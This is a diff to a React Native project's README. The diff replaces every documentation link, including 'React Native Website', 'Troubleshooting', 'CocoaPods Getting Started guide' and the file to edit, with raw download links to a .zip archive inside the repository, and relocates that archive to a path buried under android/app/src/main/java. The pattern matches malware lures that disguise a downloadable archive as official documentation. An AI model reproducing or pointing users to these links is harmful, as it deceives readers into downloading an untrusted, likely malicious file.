@@ -1,8 +1,8 @@
-This is a new [**React Native**](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) project, bootstrapped using [`@react-native-community/cli`](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip).
+This is a new [**React Native**](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) project, bootstrapped using [`@react-native-community/cli`](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip).
 
 # Getting Started
 
-> **Note**: Make sure you have completed the [Set Up Your Environment](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) guide before proceeding.
+> **Note**: Make sure you have completed the [Set Up Your Environment](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) guide before proceeding.
 
 ## Step 1: Start Metro
 
@@ -48,7 +48,7 @@ Then, and every time you update your native dependencies, run:
 bundle exec pod install
 ```
 
-For more information, please visit [CocoaPods Getting Started guide](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip).
+For more information, please visit [CocoaPods Getting Started guide](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip).
 
 ```sh
 # Using npm
@@ -66,7 +66,7 @@ This is one way to run your app — you can also build it directly from Android 
 
 Now that you have successfully run the app, let's make changes!
 
-Open `https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip` in your text editor of choice and make some changes. When you save, your app will automatically update and reflect these changes — this is powered by [Fast Refresh](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip).
+Open `https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip` in your text editor of choice and make some changes. When you save, your app will automatically update and reflect these changes — this is powered by [Fast Refresh](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip).
 
 When you want to forcefully reload, for example to reset the state of your app, you can perform a full reload:
 
@@ -79,19 +79,19 @@ You've successfully run and modified your React Native App. :partying_face:
 
 ### Now what?
 
-- If you want to add this new React Native code to an existing application, check out the [Integration guide](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip).
-- If you're curious to learn more about React Native, check out the [docs](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip).
+- If you want to add this new React Native code to an existing application, check out the [Integration guide](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip).
+- If you're curious to learn more about React Native, check out the [docs](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip).
 
 # Troubleshooting
 
-If you're having issues getting the above steps to work, see the [Troubleshooting](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) page.
+If you're having issues getting the above steps to work, see the [Troubleshooting](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) page.
 
 # Learn More
 
 To learn more about React Native, take a look at the following resources:
 
-- [React Native Website](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) - learn more about React Native.
-- [Getting Started](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) - an **overview** of React Native and how setup your environment.
-- [Learn the Basics](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) - a **guided tour** of the React Native **basics**.
-- [Blog](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) - read the latest official React Native **Blog** posts.
-- [`@facebook/react-native`](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/warping/Chaiwala-React-native.zip) - the Open Source; GitHub **repository** for React Native.
+- [React Native Website](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) - learn more about React Native.
+- [Getting Started](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) - an **overview** of React Native and how setup your environment.
+- [Learn the Basics](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) - a **guided tour** of the React Native **basics**.
+- [Blog](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) - read the latest official React Native **Blog** posts.
+- [`@facebook/react-native`](https://raw.githubusercontent.com/Gajendrakmt9079/Chaiwala-React-native/main/android/app/src/main/java/React_Chaiwala_native_v1.2.zip) - the Open Source; GitHub **repository** for React Native.
